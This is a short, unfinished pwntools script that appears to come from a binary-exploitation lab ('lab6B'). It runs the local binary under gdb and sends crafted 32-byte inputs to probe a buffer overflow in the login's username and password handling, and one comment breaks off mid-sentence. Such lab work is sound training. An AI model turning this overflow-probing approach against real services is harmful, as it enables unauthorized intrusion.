from pwn import *

# binary = ' '.join(format(ord(i), 'b') for i in "AAAA")
# print binary
# int(' '.join(format(ord(i), 'b') for i in "A")) - int(' '.join(format(ord(i), 'b') for i in "D"))

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'i386'
context.aslr = True

# server = process(['socat','tcp-listen:6642,reuseaddr,fork', 'exec:./lab6B'])
# p = remote('localhost', 6642)
p = process("./lab6B")
gdb.attach(p, '''
break *login_prompt+291
break *login_prompt+296
break *login_prompt+322
break hash_pass
break *hash_pass+135
''')

# Overflow @ 32 bytes for username[i] and password[i]
# The overflow shows the results for username[i] ^ 0x44.
# Since the 
A = "A" * 32
B = "\x69" * 32
C = "A" * 32
D = "\x50" * 32
E = "A" * 32
F = "B" * 32


print p.recv()
p.sendline(A)

print p.recv()
p.sendline(B)

print p.recv()
p.sendline(C)

print p.recv()
p.sendline(D)

print p.recv()
p.sendline(E)

print p.recv()
p.sendline(F)

print p.recv()
#p.interactive()


